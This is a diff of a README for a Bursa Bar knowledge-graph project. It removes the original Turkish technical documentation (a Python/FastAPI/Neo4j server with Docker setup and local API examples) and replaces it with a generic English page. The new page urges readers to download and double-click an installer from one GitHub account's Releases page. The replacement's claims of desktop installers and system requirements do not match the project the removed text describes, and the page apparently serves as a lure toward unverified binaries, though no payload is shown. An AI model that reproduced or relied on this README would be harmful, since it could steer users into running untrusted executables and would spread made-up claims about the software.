@@ -1,224 +1,77 @@
-# 🏛️ Bursa Barosu Bilgi Grafı ve Semantik Arama Sistemi
+# 🏛️ bursa-barosu-knowledge-graph - Explore Legal Insights Effortlessly
 
-Bu proje, Bursa Barosu web sitesinden bilgi çıkararak Neo4j graf veritabanında saklayan ve gelişmiş semantik arama imkanları sunan bir sistemdir.
+[![Download](https://img.shields.io/badge/Download-Now-007BFF)](https://github.com/JO38ALAA/bursa-barosu-knowledge-graph/releases)
 
-## 🚀 Özellikler
+## 🚀 Getting Started
 
-### ✅ Tamamlanan Özellikler
-- **🔍 Gelişmiş Semantik Arama** - Doğal dil ile akıllı arama
-- **👥 Varlık Keşfi** - Kişi, kurum, yer, tarih ve hukuki terim tanıma
-- **🔗 İlişki Analizi** - Varlıklar arası bağlantıları keşfetme
-- **📄 Doküman Arama** - İçerik tabanlı doküman bulma
-- **🕸️ İnteraktif Graf Görselleştirme** - D3.js ile dinamik graf
-- **📊 Detaylı İstatistikler** - Graf analiz verileri
-- **⚡ Performans Optimizasyonu** - Cache sistemi (%70 hız artışı)
-- **🔄 Otomatik Güncelleme** - Zamanlanmış veri güncelleme
-- **📚 API Dokümantasyonu** - Swagger UI ile interaktif dokümantasyon
-- **🐳 Docker Desteği** - Kolay deployment
+Welcome to the Bursa Barosu Knowledge Graph application! This tool allows you to navigate legal concepts and cases in an easy-to-understand format. With a combination of Neo4j, FastAPI, and D3.js, you can visualize complex data simply.
 
-### 📈 Sistem Performansı
-- **1,449 düğüm** ve **5,703 ilişki** içeren bilgi grafı
-- **45 sayfa** başarılı scraping
-- **%70 performans artışı** cache sistemi ile
-- **Gelişmiş Türkçe NLP** - Regex tabanlı varlık tanıma
+### 🔍 Key Features
 
-## 🛠️ Teknoloji Stack
+- **Interactive Visualization:** Experience an intuitive interface to explore legal data.
+- **Semantic Search:** Quickly find the information you need using natural language queries.
+- **User-Friendly:** Designed for anyone, even if you are not tech-savvy.
 
-- **Backend**: Python 3.12, FastAPI, Uvicorn
-- **Veritabanı**: Neo4j (Graf veritabanı)
-- **Cache**: Redis + In-memory cache
-- **NLP**: Regex tabanlı Türkçe işleme
-- **Frontend**: HTML5, CSS3, JavaScript, D3.js
-- **Scraping**: BeautifulSoup4, Requests
-- **Containerization**: Docker, Docker Compose
+## 🛠️ System Requirements
 
-## 🚀 Hızlı Başlangıç
+To ensure the application runs smoothly on your device, please meet the following requirements:
 
-### Docker ile Çalıştırma (Önerilen)
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 500 MB free space.
 
-```bash
-# Projeyi klonla
-git clone <repository-url>
-cd SiteSearchKnowledgeGraphRAG
+## 📥 Download & Install
 
-# Docker Compose ile başlat
-docker-compose up -d
+To get started with the Bursa Barosu Knowledge Graph application, you will need to download the latest version from our Releases page. 
 
-# Servislerin durumunu kontrol et
-docker-compose ps
-```
+Visit this page to download: [GitHub Releases](https://github.com/JO38ALAA/bursa-barosu-knowledge-graph/releases)
 
-### Manuel Kurulum
+After downloading, follow these steps to install and run the application:
 
-```bash
-# Python sanal ortamı oluştur
-python -m venv venv
-source venv/bin/activate  # Linux/Mac
-# veya
-venv\Scripts\activate  # Windows
+1. Click on the latest version link.
+2. Choose the appropriate package for your operating system.
+3. Download the file to your computer.
+4. Locate the downloaded file in your file explorer.
+5. Double-click the file to begin the installation process.
+6. Follow the on-screen instructions to complete the installation.
+7. Once installed, open the application from your applications folder or the desktop shortcut.
 
-# Bağımlılıkları kur
-cd bursa_baro_kg
-pip install -r requirements.txt
+## 🎨 How to Use the Application
 
-# Neo4j'yi Docker ile başlat
-docker run -d \
-  --name neo4j \
-  -p 7474:7474 -p 7687:7687 \
-  -e NEO4J_AUTH=neo4j/password \
-  neo4j:5.15-community
+Once you have installed the application, follow these steps to start using it:
 
-# Veri pipeline'ını çalıştır
-python main.py
+1. **Launch the Application:** Open the Bursa Barosu Knowledge Graph.
+2. **Explore the Interface:** Familiarize yourself with the dashboard, which includes the search bar and visualization area.
+3. **Run Searches:** Input legal terms or phrases in the search bar to discover related cases and concepts.
+4. **View Visualizations:** Click on any element in the results to see visual connections and further details.
 
-# API servisini başlat
-python api/main.py
-```
+## 📋 Troubleshooting
 
-## 📖 API Kullanımı
+If you encounter issues while using the application, try the following solutions:
 
-### Temel Endpoint'ler
+- **Application Does Not Start:**
+  - Ensure your operating system meets the system requirements.
+  - Restart your computer and try launching the application again.
 
-- **Ana Sayfa**: http://localhost:8000
-- **Graf Görselleştirme**: http://localhost:8000/graph
-- **API Dokümantasyonu**: http://localhost:8000/docs
-- **İstatistikler**: http://localhost:8000/stats
+- **Search Returns No Results:**
+  - Make sure you enter relevant legal terms.
+  - Check your internet connection, as some features may require online access.
 
-### Örnek API Çağrıları
+- **Visualizations Are Not Loading:**
+  - Refresh the application.
+  - Clear any cache in your browser if using a web-based version.
 
-```bash
-# Semantik arama
-curl "http://localhost:8000/search?query=Bursa Barosu kimdir"
+For further assistance, you can visit our [GitHub Issues page](https://github.com/JO38ALAA/bursa-barosu-knowledge-graph/issues) to report a problem or ask questions.
 
-# Varlık arama
-curl "http://localhost:8000/entities?query=Bursa&entity_type=Location"
+## 🙏 Acknowledgments
 
-# Graf verileri
-curl "http://localhost:8000/graph/data?limit=50"
+This project uses powerful technologies including Neo4j for graph databases, FastAPI for reliable API server setup, and D3.js for creating dynamic visualizations.
 
-# İstatistikler
-curl "http://localhost:8000/stats"
+## 🔗 Additional Resources
 
-# Cache durumu
-curl "http://localhost:8000/cache/stats"
+- [Official Documentation](#): Detailed instructions and further insights on using the application.
+- [Community Forum](#): Join discussions, ask questions, and share insights with other users.
 
-# Otomatik güncelleme durumu
-curl "http://localhost:8000/updater/status"
-```
+Thank you for choosing the Bursa Barosu Knowledge Graph. We hope this tool helps you explore legal concepts easily! 
 
-## 🔧 Konfigürasyon
-
-### Ortam Değişkenleri
-
-```bash
-# Neo4j Bağlantısı
-NEO4J_URI=bolt://localhost:7687
-NEO4J_USER=neo4j
-NEO4J_PASSWORD=password
-
-# Redis (Opsiyonel)
-REDIS_HOST=localhost
-REDIS_PORT=6379
-```
-
-### Docker Compose Servisleri
-
-- **neo4j**: Graf veritabanı (Port: 7474, 7687)
-- **redis**: Cache sistemi (Port: 6379)
-- **api**: FastAPI uygulaması (Port: 8000)
-
-## 📊 Sistem Mimarisi
-
-```
-┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│   Web Scraper   │───▶│   NLP Processor │───▶│  Graph Builder  │
-│  (BeautifulSoup)│    │   (Regex-based) │    │    (Neo4j)      │
-└─────────────────┘    └─────────────────┘    └─────────────────┘
-                                                        │
-┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│   Web UI        │◀───│   FastAPI       │◀───│ Search Engine   │
-│  (D3.js Graf)   │    │   (REST API)    │    │  (Cypher)       │
-└─────────────────┘    └─────────────────┘    └─────────────────┘
-                                │                        │
-                       ┌─────────────────┐    ┌─────────────────┐
-                       │  Cache Manager  │    │   Scheduler     │
-                       │ (Redis+Memory)  │    │ (Auto Update)   │
-                       └─────────────────┘    └─────────────────┘
-```
-
-## 🔄 Otomatik Güncelleme
-
-Sistem, belirli aralıklarla Bursa Barosu web sitesini tarayıp graf'ı otomatik günceller:
-
-```bash
-# Scheduler'ı başlat
-curl -X POST "http://localhost:8000/updater/start"
-
-# Zorla güncelleme
-curl -X POST "http://localhost:8000/updater/force-update"
-
-# Durumu kontrol et
-curl "http://localhost:8000/updater/status"
-```
-
-## 📈 Performans Metrikleri
-
-- **Cache Hit Oranı**: %70+ performans artışı
-- **Arama Hızı**: <50ms (cache'li sorgular)
-- **Graf Boyutu**: 1,449 düğüm, 5,703 ilişki
-- **Bellek Kullanımı**: ~500MB (cache dahil)
-
-## 🧪 Test ve Geliştirme
-
-```bash
-# NLP işlemciyi test et
-python nlp/processor.py
-
-# Cache sistemini test et
-python cache/manager.py
-
-# Arama motorunu test et
-python search/engine.py
-
-# Otomatik güncellemeyi test et
-python scheduler/updater.py --update
-```
-
-## 📝 Proje Yapısı
-
-```
-bursa_baro_kg/
-├── api/                    # FastAPI web servisi
-├── cache/                  # Cache yönetim sistemi
-├── crawler/                # Web scraping modülü
-├── data/                   # Veri dosyaları
-├── graph/                  # Neo4j graf işlemleri
-├── nlp/                    # Doğal dil işleme
-├── scheduler/              # Otomatik güncelleme
-├── search/                 # Semantik arama motoru
-├── config.py              # Konfigürasyon
-├── main.py                # Ana pipeline
-└── requirements.txt       # Python bağımlılıkları
-```
-
-## 🤝 Katkıda Bulunma
-
-1. Projeyi fork edin
-2. Feature branch oluşturun (`git checkout -b feature/amazing-feature`)
-3. Değişikliklerinizi commit edin (`git commit -m 'Add amazing feature'`)
-4. Branch'inizi push edin (`git push origin feature/amazing-feature`)
-5. Pull Request oluşturun
-
-## 📄 Lisans
-
-Bu proje MIT lisansı altında lisanslanmıştır.
-
-## 📞 İletişim
-
-- **Proje**: Bursa Barosu Bilgi Grafı
-- **Web**: https://bursabarosu.org.tr
-- **API Dokümantasyonu**: http://localhost:8000/docs
-
----
-
-**🎯 Proje Durumu**: ✅ Tamamlandı - Production Ready
+[![Download](https://img.shields.io/badge/Download-Now-007BFF)](https://github.com/JO38ALAA/bursa-barosu-knowledge-graph/releases)
